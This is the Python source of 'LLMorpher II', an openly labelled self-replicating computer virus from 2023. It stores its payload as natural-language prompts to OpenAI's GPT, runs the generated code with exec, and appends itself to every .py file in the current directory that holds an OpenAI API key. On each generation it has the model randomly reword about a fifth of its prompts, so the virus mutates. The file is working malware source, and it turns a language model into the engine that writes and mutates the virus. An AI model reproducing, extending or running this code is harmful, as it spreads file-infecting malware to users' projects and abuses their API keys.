import openai

# LLMorpher II by Second Part To Hell
# A new-age AI-based linguisto-morphic self-replicator, powered by OpenAIs GPT. Fully encodes and mutates the self-replicator into natural language.
# 
# See my text for details: Using GPT to encode and mutate computer viruses entirely in natural language
#
# March 2023
# https://github.com/SPTHvx/SPTH
# sperl.thomas@gmail.com
# twitter: @SPTHvx     

openai.api_key = "..." # Add your openai key here

prompts_list=[]
tofile_list=[]
prompts_list.append("Write a python function get_files which returns a list file_list with all .py files in the current directory. If you need to import some packages, do it.")
prompts_list.append("Write a python function get_content which takes an input argument (string of a text file), reads the text file and returns its full file content. Do not write anything else except of the python code!")
prompts_list.append("Write a python function is_key, which takes a string as an input and return True,  if it contains the substring 'openai.api_key' (which has 14 characters) exactly once, otherwise False. Be careful, do not compare the entire string, but find how often the substring is contained! Very important: Do not write anything else except of the python code, do not write print statements and do not define variables outside of the function. Just write the function!")
prompts_list.append("Write a python function write_to_file which takes a filename and a string as an input, and append one line break (do not forget!) and the input string to the file. Output only the python code, nothing else!")
prompts_list.append("Write a loop over all elements returned by the function get_files (which has no arguments). For each element (lets call it curr_element), test whether the function is_key with the argument returned from get_content of the current element is True. If it is True, call the function write_to_file with curr_element as the first argument, and the variable tofile_str as the second argument. (tofile_str is a variable which is defined above)")
prompts_list.append("Write a python code (only this one line) which prints: 'LLMorphism II by SPTH - a new-age AI-based linguisto-morphic self-replicator, powered by OpenAIs GPT. Fully encodes and mutates the self-replicator into natural language.'.")
prompts_list.append("Write a python code (only this one line) which prints: 'Hugs to the valhalla gang - hh86, roy g biv, JPanic, herm1t!'.")
tofile_list.append("Write a python function return_text which takes two inputs: a prompt string, and the openai key (with a default value of the value openai.api_key). The function returns returns the output of an openai text completion (ONLY USE 3 parameters!). As parameters for the openai text completion use only four parameter (!!): engine which is 'text-davinci-003', max_tokens is 1000, temperature is 0.0, and the parameter prompt. Do not use any other parameters, only these four! The parameters are not strings!")
tofile_list.append("Write a python function modify_text, with two strings as input argument. Make a new string, which is the first, then a chr(34), then the second string, then a chr(34). Use the new string as an argument for a function call to return_text. The new modify_txt function should take the output string of return_text, remove all line breaks and all double quotation marks, and return this final string.")
tofile_list.append("Write the following python function comp_str_fct, which has one argument. The argument is a list of strings. For each element of the list, call the function return_text (with the current element as the argument), and take its return value (a string). The function should combine all strings (with a line break) and return it.")
tofile_list.append("Write one line in python, which defines a string with the name tofile_str. The value of the string is 'prompts_list=[]', with a line break before and afterwards.")
tofile_list.append("Write one line in python, which appends and store to the string with the name tofile_str. The appended value is 'tofile_list=[]', followed by a line break.")
tofile_list.append("Write one line in python, which defines the string called reform_str, and initialize it with the string (Keep the entire content the same. produce a syntactical correct python line!) 'Slightly reformulate in natural langauge the next sentence,'")
tofile_list.append("Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) ' without changing its meaning, '")
tofile_list.append("Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) ' do not interpret the content, '")
tofile_list.append("Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) 'keep the length and structure of the string as similar as possible, '")
tofile_list.append("Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) 'very importantly do not change the content at all, '")
tofile_list.append("Write one line in python, which appends to the string called reform_str (Keep the entire content the same, keep the colon. produce a syntactical correct python line!) ' and only make slight modifications: '")
tofile_list.append("Write a python loop over all elements of the list prompts_list. For each element with 20% probability, replace the element with the return value of the function modify_text with two arguments: the variable reform_str and the current elements. You should indeed modify the elements in prompts_list. Assume that the list prompts_list, modify_text and reform_str are already defined, do not redefine any of them! Very important: Do not write anything except of the loop and the import of the random package.")
tofile_list.append("Write a python loop over all elements of the list tofile_list. For each element with 20% probability, replace the element with the return value of the function modify_text with two arguments: the variable reform_str and the current elements. You should indeed modify the elements in tofile_list. Assume that the list tofile_list, modify_text and reform_str are already defined, do not redefine any of them! Very important: Do not write anything except of the loop and the import of the random package.")
tofile_list.append("Write a short python code (no tests or examples). Make a loop over all elements in the list called prompts_list. Directly start with the loop, do not define any variables beforehand (you can assume that tofile_str is already defined). For each element, do the following three steps: 1) Add to the string tofile_str the string 'prompts_list.append('. 2) Add to the string tofile_str the current element of the loop with double quotation marks. 3) Add to the string tofile_str the string ')' and a line break.")
tofile_list.append("Write a short python code (no tests or examples). Make a loop over all elements in the list called tofile_list. Directly start with the loop, do not define any variables beforehand (you can assume that tofile_str is already defined). For each element, do the following three steps: 1) Add to the string tofile_str the string 'tofile_list.append('. 2) Add to the string tofile_str the current element of the loop with double quotation marks. 3) Add to the string tofile_str the string ')' and a line break.")
tofile_list.append("Write a python code (only this one line) which defines a variable vic_code. The variable is generated by a function call of comp_str_fct with the argument being the variable called tofile_list.")
tofile_list.append("Write a python code, which appends to the string variable tofile_str a line break, and then the variable vic_code (these are two variable names, not strings themselves!). Store the result in the variable tofile_str.")
tofile_list.append("Write a python code (only this one line) which defines a variable complete_str. The variable is generated by a function call of comp_str_fct with the argument being the variable called  prompts_list.")
tofile_list.append("Write a python code (only this one line) which takes a multi line python code called complete_str, and runs it.")


def return_text(prompt):
    completion = openai.Completion.create(
        engine="text-davinci-003",
        prompt=prompt,
        max_tokens=1024,
        temperature=0.0,
    )
    return completion.choices[0].text


def modify_text(string1, string2):
    new_string = string1 + chr(34) + string2 + chr(34)
    return return_text(new_string).replace('\n', '').replace('"', '')

def comp_str_fct(list_of_strings):
    all_str=''
    for ll in list_of_strings:
        all_str+='\n'+return_text(ll)
    return all_str


tofile_str = '\nprompts_list=[]\n'


tofile_str += 'tofile_list=[]\n'


reform_str = 'Slightly reformulate in natural langauge the next sentence,'


reform_str += ' without changing its meaning, '


reform_str += ' do not interpret the content, '


reform_str += 'keep the length and structure of the string as similar as possible, '


reform_str += 'very importantly do not change the content at all, '


reform_str += ' and only make slight modifications: '


import random

for i in range(len(prompts_list)):
    if random.random() < 0.2:
        prompts_list[i] = modify_text(reform_str, prompts_list[i])

import random

for i in range(len(tofile_list)):
    if random.random() < 0.2:
        tofile_list[i] = modify_text(reform_str, tofile_list[i])

for element in prompts_list:
    tofile_str += 'prompts_list.append("{}")\n'.format(element)

for l in tofile_list:
    tofile_str+='tofile_list.append("'+l+'")\n'

vic_code = comp_str_fct(tofile_list)

tofile_str = tofile_str + '\n' + vic_code

complete_str=comp_str_fct(prompts_list)

exec(complete_str)
